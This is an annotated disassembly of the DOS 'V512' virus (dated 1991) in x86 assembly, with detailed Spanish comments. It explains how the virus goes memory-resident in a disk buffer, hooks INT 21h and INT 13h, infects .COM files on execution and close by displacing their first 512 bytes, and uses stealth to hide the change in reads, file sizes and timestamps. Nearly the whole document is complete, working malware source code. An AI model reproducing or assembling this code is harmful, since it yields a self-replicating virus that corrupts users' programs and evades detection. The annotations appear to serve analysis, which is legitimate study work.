

; Formato de la infecci¢n:
;         Bytes   1 - 510 => virus
;               511 - 512 => dos primeros bytes programa
;        despu‚s del final del programa => 512 primeros bytes del programa
;
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             V512                                     ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   18-Jul-91                                            ÛÛ
;ÛÛ      Version:                                                        ÛÛ
;ÛÛ      Passes:    9          Analysis Options on: HQRS                 ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

int21hPoint     equ     4                       ; (76EF:0004=0)
data_4e         equ     0FE07h                  ; (76EF:FE07=0)
data_2e         equ     0200h

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

v512            proc    far

; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                       rutina de instalaci¢n
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

start:
                mov     si,4
                mov     word ptr [si+4Eh],0CB95h   ; CS:52h = CB95h
                                                   ; CS:52h = 95h = xchg ax,bp
                                                   ; CS:53h = CBh = ret
                xchg    ax,bp

                mov     ds,si
                lds     dx,dword ptr [si+8]     ; Load 32 bit ptr
                                    ;DS:DX => punto de entrada nueva int 13h
                                    ;en SI:[SI+8]

                mov     ah,13h
                int     2Fh      ; Multiplex/Spooler al=func 00h
                                 ; INT 2F - Multiplex - DOS 3.3+
                                 ; SET DISK INTERRUPT HANDLER
                                 ; AH = 13h
                                 ; DS:DX -> interrupt handler disk driver
                                 ; calls on read/write
                                 ; ES:BX = address to restore INT 13 to
                                 ; on system halt (exit from root
                                 ; shell) or warm boot (INT 19)
                                 ; Return:
                                 ;         DS:DX from previous invocation
                                 ; of this function
                                 ;         ES:BX from previous invocation
                                 ; of this function

                push    ds     ;DS:DX => vector a ROM entry point
                push    dx

                int     2Fh    ; Multiplex/Spooler al=func 00h

                               ; reinstala viejo vector guardando
                               ; rom entry point. OJO: En DR DOS
                               ; parece que esto falla.

                pop     ax
                mov     di,0F8h
                stosw                           ; Store ax to es:[di]
                pop     ax
                stosw                           ; Store ax to es:[di]
                                                ; ES = CS


                                              ; pone el rom entry point
                                              ; vector en ES:0F8h

                mov     ds,si
                lds     ax,dword ptr [si+40h]   ; Load 32 bit ptr
                                                ; SI = 4 = DS
                                                ; lds ax, [si + 40h] =
                                                ; lds ax, [4 + 40h]
                                                ; ds:44h = int 21h vector
                                                ; despu‚s de la operaci¢n
                                                ; queda int 21h vector
                                                ; en DS:AX


                cmp     ax,di     ; Esto ser  usado m s adelante, prox. jnz


                stosw              ; Store ax to es:[di]
                mov     ax,ds
                stosw              ; Store ax to es:[di]
                                   ; pone int 21h vector en
                                   ; ES:[DI]
                                   ; como DI era 0F8h, ahora es
                                   ; 0F8h + 4 (por los dos STOSW
                                   ; anteriores), despu‚s de la
                                   ; operaci¢n queda en ES:0F8h
                                   ; 13hOFS, 13hSEG, 21hOFS, 21hSEG
                                   ; Esto es inmediatamente
                                   ; antes del c¢digo del virus,
                                   ; los 4 words antes de 100h
                                   ; posici¢n llamada int21hPoint

                push    es         ;
                push    di         ; Guarda ES y DI
                                   ; (Referencia 1)

                jnz     loc_1      ; Jump if not zero
                                   ; Si ax <> di ( o sea,
                                   ; offset int 21h <> 0F8h + 4
                                   ; = 0FCh)
                                   ; Si es = 0FCh entonces puede que el
                                   ; virus est‚ instalado

                                   ; Por lo tanto habr  que
                                   ; verificarlo en detalle

                shl     si,1       ; Shift w/zeros fill
                mov     cx,0FFh
                repe    cmpsw      ; Rep zf=1+cx >0 Cmp [si] to es:[di]

                                   ; Se fija si est  instalado

                jz      loc_2      ; Jump if zero
                                   ; Si ambas strings son iguales
                                   ; est  instalado
                                   ; y entonces no instalo

loc_1:                             ;  xref 76EF:012A
                mov     ah,52h     ;
                int     21h        ; DOS Services  ah=function 52h
                                   ;  get DOS data table ptr es:bx


                push    es                 ; Guardo el segmento de la tabla

                mov     si,0F8h


                les     di,dword ptr es:[bx+12h]        ; Load 32 bit ptr

                                             ; ES:DI = 12h DWORD
                                             ; pointer to first disk buffer
                                             ; in buffer chain
                                             ; DOS 3.1 - 3.3

                                             ; EN DOS 4+ no anda: hay
                                             ; 12h = DWORD
                                             ; pointer to disk buffer
                                             ; info record

                mov     dx,es:[di+2]        ; DX = offset pr¢ximo disk buffer

                mov     cx,103h           ; mueve 103h words = 206h bytes =
                                          ; 518 bytes a partir de offset
                                          ; 0F8h
                                          ;
                rep     movs word ptr es:[di],word ptr ss:[si]
                                          ; Rep when cx >0 Mov [si] to es:[di]
                                          ; mov CS:[SI] to ES:[DI]
                                          ; Se copia a si mismo al primer
                                          ; buffer de disco
                                          ; a partir de CS:0F8h
                                          ; hasta CS:02FEh

                                          ; Supongo que ES:00 es
                                          ; igual a ES:DI, o sea el
                                          ; buffer empieza en el comienzo
                                          ; del segmento


                mov     ds,cx           ; DS = CX = 0
                mov     di,16h

                mov     word ptr [di+6Eh],0FCh
                mov     [di+70h],es
                                        ; pone en int 21h ptr
                                        ; ES:0FCh
                                        ; (ES: segmento del 1er buffer)

                                        ; apunta 21h al offset 0FCh del
                                        ; buffer de disco, o sea,
                                        ; en CS:01F4h

                pop     ds          ; pongo en DS el segmento de la tabla

                mov     [bx+14h],dx  ; offset 1er buffer lo hago = al segundo:
                                     ; el 2do buffer se convierte en el
                                     ; primero y el primer buffer queda
                                     ; reservado para el virus.

                mov     dx,ss        ; DX = SS = CS
                mov     ds,dx        ; DS = CS

                mov     bx,[di-14h]  ; DI = 16h
                                     ; BX = [CS:2] => byte 2 del PSP
                                     ; Segmento del
                                     ; primer byte despu‚s de la memoria
                                     ; asignada al programa por el DOS

                dec     bh           ; BX = BX - 100h
                mov     es,bx        ; ES = BX

                cmp     dx,[di]      ; DI = 16h
                mov     ds,[di]      ; CS:[16h] = segmento del PSP
                                     ; del prog. padre
                mov     dx,[di]      ; DS = DX = CS:[16] =
                                     ; segmento del PSP del prog. padre

                dec     dx
                mov     ds,dx        ; DS = Segmento del PSP del padre - 1

                mov     si,cx        ; SI = CX = 0

                mov     dx,di        ; DX = 16h

                mov     cl,28h       ; CX = 28h
                rep     movsw        ; Rep when cx >0 Mov [si] to es:[di]
                                     ; muevo 28h bytes CS:[00] a ES:[16h]
                                     ; a £ltimo segmento
                                     ; asignado - 100h

                mov     ds,bx        ; DS = 16h

                jc      loc_4        ; Jump if carry Set (Si seg. PSP padre
                                     ; > CS)
                                     ; entonces el padre es COMMAND.COM?

loc_2:                                          ;  xref 76EF:0133
                mov     si,cx               ; SI = CX = 0
                mov     ds,ss:[si+2Ch]      ; DS = CS:[2Ch] = Segmento del
                                            ; environment

loc_3:                                          ;  xref 76EF:0186
                lodsw                 ; String [si] to ax
                                      ; leo del environment un word

                dec     si            ; disminuyo SI en uno,
                                      ; como aument¢ en dos por el
                                      ; lodsw va aumentando de a uno

                and     ax,ax         ; hasta que encuentro
                                      ; un word 00 en el environment
                                      ; db 00 es de end of string, dw 00 es
                                      ; de end of environment

                jnz     loc_3         ; voy repitiendo


                lea     dx,[si+3]    ; load effective address de
                                     ; el punto que encontr¢ + 3
                                     ; EN DOS 3+ es el filename del
                                     ; programa due¤o del environment

loc_4:                                          ;  xref 76EF:017A

                mov     ax,3D00h
                int     21h         ; DOS Services  ah=function 3Dh
                                    ;  open file, al=mode,name@ds:dx
                                    ; Abre el archivo due¤o del
                                    ; environment para lectura solamente


                xchg    ax,bx      ; AX tiene el handle, despues de esto est 
                                   ; en BX

                pop     si         ; Pone en SI el word que est  en el
                push    si         ; tope del stack, que era el DI salvado
                                   ; antes, = 0100h (ver Referencia 1)

                push    ss         ; SS = CS
                pop     ds         ; DS = SS = CS

                push    ss         ;
                pop     es         ; ES = SS = CS

                mov     dx,si      ; DX = 100h

                mov     cl,2       ; CX = 02
                mov     ah,3Fh     ;
                int     21h        ; DOS Services  ah=function 3Fh
                                   ;  read file, cx=bytes, to ds:dx
                                   ; leo 2 bytes del archivo a
                                   ; DS:DX
                                   ; OJO! La t‚cnica Stealth ya est 
                                   ; funcionando, son los 2 primeros
                                   ; bytes del programa como si
                                   ; no estuviese infectado!
                                   ; lee los 2 primeros bytes del
                                   ; programa a CS:100h

                mov     dl,cl      ; DL = CL = 02h ; DX = 102h
                xchg    cl,ch      ; CX = 200h

                mov     di,2FEh

                cmpsw               ; Cmp [si] to es:[di]
                                    ; compara CS:100h con ES:2FEh
                                    ; como ES=CS=DS
                                    ; CS:100h con CS:2FEh
                                    ; en 2FEh estar¡a la primera
                                    ; instrucci¢n del programa
                                    ; Se fija si es correcto

                jnz     loc_5       ; Jump if not zero ????
                                    ; en AX estar¡a el file handle
                                    ; as¡ que no tiene sentido la int
                                    ; 21h...

                mov     ah,3Fh      ;

loc_5:                              ;  xref 76EF:01A7

                jmp     $-15Bh      ; jmp CS:50h
                                    ; en CS:50h hay las
                                    ; siguientes instrucciones:

                                    ; int 21h
                                    ; xchg ax,bp
                                    ; ret

                                    ; o sea que hace una lectura de disco
                                    ; y vuelve con retf (en el tope del stack
                                    ; hay 100h, as¡ que el retf lo vuelve
                                    ; a CS:100h, el principio del programa)
                                    ; Lee 512 bytes (200h)
                                    ; restaura la primera parte del programa
                                    ; (as¡ est  completo en memoria)
                                    ; y lo ejecuta como si no estuviese
                                    ; infectado

; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                          rutina para READ
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

loc_6:                                          ;  xref 76EF:020A
                                                ; rutina para READ

                call    sub_1                   ; (02E5)

                mov     si,es:[di]    ; SI = offset en file

                mov     ah,3Fh        ; '?'
                int     21h           ; DOS Services  ah=function 3Fh
                                      ;  read file, cx=bytes, to ds:dx
                                      ; leo lo que me pidieron

                cmp     si,bp         ; SI = 200h?

                jae     loc_8         ; Jump if above or =
                                      ; le¡ desde despu‚s de los primeros
                                      ; 512 bytes del archivo?
                                      ; me voy a loc_8, vuelvo de la int.
                                      ; el archivo es igual

                push    ax            ; guardo ax

                mov     al,es:[di-8]    ; pongo en AL file
                                        ; time en formato packed

                not     al
                and     al,1Fh         ; No est  infectada?

                jnz     loc_7          ; Jump if not zero
                                       ; ya le¡ y vuelvo de la int

                                      ; si est  infectado
                                      ; y le¡ desde antes de los
                                      ; 512 bytes del archivo
                                      ; hay que corregir lo le¡do para
                                      ; que no se note la infecci¢n

                add     si,es:[di-4]  ; offset en file =
                                      ; offset en file + file size

                xchg    si,es:[di]    ; offset en file =
                                      ; offset en file + file size
                                      ; guardo en SI el offset en file
                                      ; que quer¡a leer
                                      ; y en el FST pongo el offset
                                      ; donde realmente est  la informaci¢n
                                      ; que deber¡a estar ah¡

                add     es:[di-4],bp  ; sumo 512 bytes al tama¤o del archivo
                                      ; para compensar "error" en el
                                      ; directorio
                                      ; y no me d‚ EOF

                mov     ah,3Fh        ;
                int     21h           ; DOS Services  ah=function 3Fh
                                      ;  read file, cx=bytes, to ds:dx
                                      ; leo lo que deber¡a haber le¡do
                                      ; si el virus no estuviese
                                      ; (stealth!)

                                      ; notar que si me paso del l¡mite
                                      ; entre virus-c¢digo, (offset 512)
                                      ; la lectura anterior ya ley¢
                                      ; los bytes que deber¡a haber le¡do
                                      ; luego de este l¡mite, y el DOS
                                      ; encuentra un EOF y lee s¢lo lo
                                      ; necesario como para que quede
                                      ; la informaci¢n correctamente
                                      ; como si el virus no estuviese


                sub     es:[di-4],bp  ; vuelvo el tama¤o a su normalidad

                xchg    ax,si         ; pongo en SI n£mero de bytes le¡dos
                                      ; y en AX offset en file "declarado"

                stosw             ; Store ax to es:[di]
                                  ; vuelvo todo a la normalidad
                                  ; pongo el offset donde deber¡a estar
                                  ; si el virus no estuviese
                                  ; y vuelvo de la interrupt

loc_7:                            ;  xref 76EF:01C5, 01F2, 0226
                pop     ax
loc_8:                            ;  xref 76EF:01BA
                pop     es
                pop     si
                pop     di
                pop     bp        ; restauro registros
                retf    2         ; Return far
                                  ; vuelvo de la interrupci¢n

; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                 rutina para Get file date and time
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

loc_9:                                          ;  xref 76EF:0210
                                                ; rutina para
                                                ; Get file date and time

                int     21h                     ; Hago el Get file
                                                ; date and time
                                                ; como si nada.

                lahf                            ; Load ah from flags

                mov     al,cl
                and     al,1Fh
                cmp     al,1Fh                  ; Si los segundos son
                                                ; = 1Fh, el archivo est 
                                                ; infectado
                jne     loc_10                  ; Jump if not equal
                xor     cl,al
loc_10:                                         ;  xref 76EF:01ED
                sahf                            ; Store ah into flags

                                                ; restaur‚ fecha normal

                jmp     short loc_7             ; (01DC)
                                       ; vuelvo de la interrupci¢n
                                       ; restaurando AX


 ; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
 ;                  Punto de entrada int 21h  del virus
 ; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

                push    bp
                push    di
                push    si
                push    es        ; Guarda registros que va a usar

                cld                    ; Clear direction

                mov     bp,sp          ; "vac¡o" el stack

                mov     es,[bp+0Ah]    ; pone en ES el valor del byte
                                       ; 0Ah del stack

                mov     di,010B      ;
                mov     si,di        ;  SI = DI = 010Bh

                cmps word ptr cs:[si],word ptr es:[di]  ; Cmp [si] to es:[di]

                                   ; se fija si en ES:010Bh hay lo mismo que
                                   ; en CS:010Bh
                                   ; el valor de ES lo saca del stack
                                   ; es el segmento de donde se llam¢ a la
                                   ; interrupt
                                   ; CS:010Bh es el offset de esta misma
                                   ; instrucci¢n
                                   ; si son iguales
                                   ; es que se llam¢ desde este CS, o sea,
                                   ; de este c¢digo,
                                   ; por lo tanto se debe seguir con la
                                   ; int 21h original
                                   ; si no redirecciona lo que le
                                   ; interesa
;    Se fija en el stack el segmento desde donde fue llamada la interrupci¢n,
; luego se fija si en ese segmento, en el offset 10Bh est  el mismo word que en
; el offset 10Bh de su CS. Por supuesto, para darle m s "sabor" a esto, en ese
; word de el CS est  el mism¡simo CMPS con que logra todo esto...



                jz      loc_12     ; Jump if zero
                                   ; Si son iguales, vuelvo a int 21h original

                cmp     ah,3Fh     ; Es Read?
                je      loc_6      ; Jump if equal

                push    ax         ; guardo AX

                cmp     ax,5700h   ; Es Get file date and time?
                je      loc_9      ; Jump if equal


                cmp     ah,3Eh     ; Es close file?
                pushf              ; Push flags
                push    bx
                push    cx
                push    dx
                push    ds         ; guardo m s registros
                jz      loc_14     ; Jump if zero
                                   ; salto a rutina de close file

                cmp     ax,4B00h   ; Es EXEC load and execute?
                je      loc_13     ; Jump if equal


loc_11:                                         ;  xref 76EF:023A, 02B2
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                popf                            ; Pop flags
                jz      loc_7                   ; Jump if zero
                pop     ax
loc_12:                                         ;  xref 76EF:0205
                pop     es
                pop     si
                pop     di
                pop     bp    ; restauro registros

                jmp     dword ptr cs:int21hPoint    ; (76EF:0004=0)
                                                ; retomo int. 21h original
                                                ; no modifiqu‚ nada.


; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                 rutina para EXEC load and execute
;                       Ac  es donde infecta!
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß


loc_13:                                         ;  xref 76EF:021F
                              ; rutina para EXEC load and execute

                mov     ah,3Dh      ;
                int     21h         ; DOS Services  ah=function 3Dh
                                    ;  open file, al=mode,name@ds:dx

                xchg    ax,bx       ; guardo el handle en BX


; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                        rutina  de close file
;                        Ac  es donde infecta!
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

loc_14:                                         ;  xref 76EF:021A

                                  ; rutina de close file

                call    sub_1     ; (02E5)
                                  ; obtengo:
                                  ;ES:DI puntero a offset actual del
                                  ; archivo en FST
                                  ;BP: 200h (512 decimal, longitud
                                  ; del virus en el file)


                jc      loc_11    ; Jump if carry Set
                                  ; Si hubo error, vuelvo de la int.

                xor     cx,cx    ; Zero register
                                 ; CX = 0
                xchg    cx,bp    ; BP = 0 ; CX = BP = 200h
                mov     ds,bp    ; DS = 0
                mov     si,4Ch   ; SI = 4Ch
                mov     ax,203h  ; AX = 203h
                mov     dx,cs    ; DX = CS

                xchg    ax,[si+44h]  ; Pongo Int 24h
                xchg    dx,[si+46h]  ; en CS:203h
                                     ; ver Int 24h Interrupt Handler
                                     ; lo que hace el handler es devolver
                                     ; "fail system call in progress"


                push    dx     ; Guardo en el stack el vector original
                push    ax     ; a int 24h


                lodsw          ; String [si] to ax
                push    ax
                lodsw          ; String [si] to ax
                push    ax
                               ; Guardo en el stack pointer a int 13h

                lds     dx,dword ptr cs:[si-50h]        ; Load 32 bit ptr
                                   ; SI = 0
                                   ; pongo en DS:DX lo que hay en CS:00
                                   ; es el puntero a Int 13h del Rom Bios

                mov     ax,2513h
                push    ax         ; guardo AX en el stack

                int     21h        ; DOS Services  ah=function 25h
                                   ;  set intrpt vector al to ds:dx
                                   ; pongo int 13h apuntando a la
                                   ; rutina original del ROM Bios
                                   ; para evitar la acci¢n de antivirus

                push    es
                pop     ds         ; DS = ES


                mov     [di],bp     ; Pongo en offset de file 0

                mov     [di-13h],ch  ; Pongo CH en file open mode
                                     ; CH = 02h
                                     ; (read - write)

                cmp     word ptr [di+13h],4F43h  ; Extensi¢n del
                                                 ; nombre del archivo
                                                 ; es "co?"?

                jne     loc_17    ; Jump if not equal
                                  ; Si no es as¡, vuelvo a la int. normal

                mov     dx,[di-4]  ; pongo en DX el tama¤o del archivo

                add     dh,ch      ; DH = DH + 2
                cmp     dh,4       ; Si no es mayor a 200h (512 bytes)

                jb      loc_17     ; Jump if below
                                   ; me voy sin infectar
                                   ; (muy chico el archivo)
                                   ; y sigo con int. normal

                test    ch,[di-11h] ; Test de atributo del file
                                    ; si es hidden (02h)

                jnz     loc_17      ; Jump if not zero
                                    ; Si el archivo es oculto, no
                                    ; infectar, vuelvo a la int. normal

                lds     si,dword ptr [di-0Eh]   ; Load 32 bit ptr
                                                ; Pongo en DS:SI
                                                ; pointer to device driver
                                                ; header if character device
                                                ; else pointer to DOS Drive
                                                ; Parameter Block (see AH=32h)

                cmp     [si+4],ch    ; CH = 02
                                     ; Offset 4 = highest sector
                                     ; number within a cluster
                                     ; (sectores por cluster)

                jbe     loc_15       ; Jump if below or =
                                     ; si es menos sigo,
                                     ; Si es m s que 2, vuelvo de la
                                     ; interrupci¢n

                dec     dx           ; DX = file length + 200h - 1

                shr     dh,1         ; divido DH por dos

                and     dh,[si+4]    ;

                jz      loc_17        ; Jump if zero
loc_15:                               ;  xref 76EF:0283

                mov     ds,bp         ; DS = 0

                mov     dx,cx         ; DX = 200h

                mov     ah,3Fh        ;
                int     21h           ; DOS Services  ah=function 3Fh
                                      ;  read file, cx=bytes, to ds:dx
                                      ; leo 512 bytes a 0000:0200h
                                      ; (final de tabla de interrupts,
                                      ; poco usado)

                mov     si,dx        ; SI = 200h
                dec     cx
                dec     cx           ; CX = 01FFh

locloop_16:                                     ;  xref 76EF:02A1
                lodsb                           ; String [si] to al
                cmp     al,cs:0FE07h[si]        ; (76EF:FE07=0)
                                                ;
                                                ; 0FE07 + 201h = 07h
                                                ;
                jne     loc_18                  ; Jump if not equal
                loop    locloop_16              ; Loop if cx > 0

                                       ; Compara lo cargado con el virus en
                                       ; memoria
                                       ; si no es igual sigo, si es igual
                                       ; vuelvo de la interrupt


loc_17:                            ;  xref 76EF:026C, 0276, 027B, 028B
                                   ;            02E3
                mov     ah,3Eh     ;
                int     21h        ; DOS Services  ah=function 3Eh
                                   ;  close file, bx=file handle
                                   ; Cierro el archivo


                pop     ax      ; AX = 2513h ?
                pop     ds
                pop     dx
                int     21h     ; DOS Services  ah=function 25h
                                ;  set intrpt vector al to ds:dx
                                ; restauro int 13h original

                pop     dx
                pop     ds
                mov     al,24h  ;
                int     21h     ; DOS Services  ah=function 25h
                                ;  set intrpt vector al to ds:dx
                                ; restauro int 24h original

                jmp     loc_11  ; (0221)
                                ; vuelvo de la int 21h
                                ;

loc_18:                         ;  xref 76EF:029F

                mov     cx,dx     ; CX = 200h

                mov     si,es:[di-4]  ; SI = File Size

                mov     es:[di],si    ; ES:[DI] = posici¢n del file pointer
                                      ; al final del archivo

                mov     ah,40h       ;
                int     21h          ; DOS Services  ah=function 40h
                                     ;  write file cx=bytes, from ds:dx
                                     ; Escribo lo que le¡ del principio del
                                     ; archivo en el final

                mov     es:[di-4],si ; pongo el file size como estaba antes
                                     ; de escribir (para que no aumente en el
                                     ; directorio)

                xchg    ax,bp        ; AX = BP = 0

                stosw                 ; Store ax to es:[di]
                                      ; Posiciono el file pointer
                                      ; al principio del archivo
                                      ; DI = DI + 2

                jc      loc_19        ; Jump if carry Set
                                      ; Si hubo alg£n error vuelvo de la int

                mov     ax,DS:data_2e     ; (76EF:0200=8B01h)
                                      ; AX = primeros dos bytes del
                                      ; programa infectado

                push    cs
                pop     ds           ; DS = CS

                mov     word ptr ds:[206h],ax   ; (76EF:0206=8022h)
                                                ; Pongo AX al final del c¢digo
                                                ; del virus
                mov     dx,8      ; DX = 8

                mov     ah,40h    ;

                int     21h       ; DOS Services  ah=function 40h
                                  ;  write file cx=bytes, to ds:dx
                                  ; Escribo 512 bytes del c¢digo del virus
                                  ; al principio del programa


                or      byte ptr es:[di-0Ah],1Fh    ; Segundos del archivo
                                                    ; infectado

loc_19:                                         ;  xref 76EF:02C8

                or      byte ptr es:[di-11h],40h   ; cierro el archivo?
                                                   ;

                jmp     short loc_17            ; (02A3)
                                                ; Vuelvo de la interrupt


 v512            endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;
;         Called from:   76EF:01AE, 0237
;
;               Entra:
;                    BX handle de archivo
;
;               Sale:
;                    ES:DI puntero a offset actual del archivo en FST
;                    BP: 200h (512 decimal, longitud del virus en el file)
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near
                push    bx           ; guardo BX (file handle)

                mov     ax,1220h
                int     2Fh          ; Multiplex/Spooler al=func 20h
                                     ; Get Job File Table entry
                                     ; devuelve en ES:DI puntero a
                                     ; System File Table de archivo
                                     ; en proceso


                mov     bl,es:[di]   ; recupero n£mero de SFT

                mov     ax,1216h
                int     2Fh          ; Multiplex/Spooler al=func 16h
                                     ; busco adress de SFT de archivo en
                                     ; proceso (en BL tengo el n£mero
                                     ; de SFT correspondiente)


                pop     bx           ; recupero handle

                                     ; obtuve en ES:DI adress
                                     ; de system file table

                mov     bp,200h      ; 512 en hexa!

                lea     di,[di+15h]   ; Load effective addr
                                      ; adress de offset actual en
                                      ; el archivo
                retn


sub_1           endp


; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;           Interrupt 24h handler mientras est  infectando
; ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; lo que hace el handler es devolver siempre
; "fail system call in progress"

                mov     al,3
                iret

                db      0CDh, 20h ; dos primeros bytes del programa infectado


seg_a           ends



                end     start



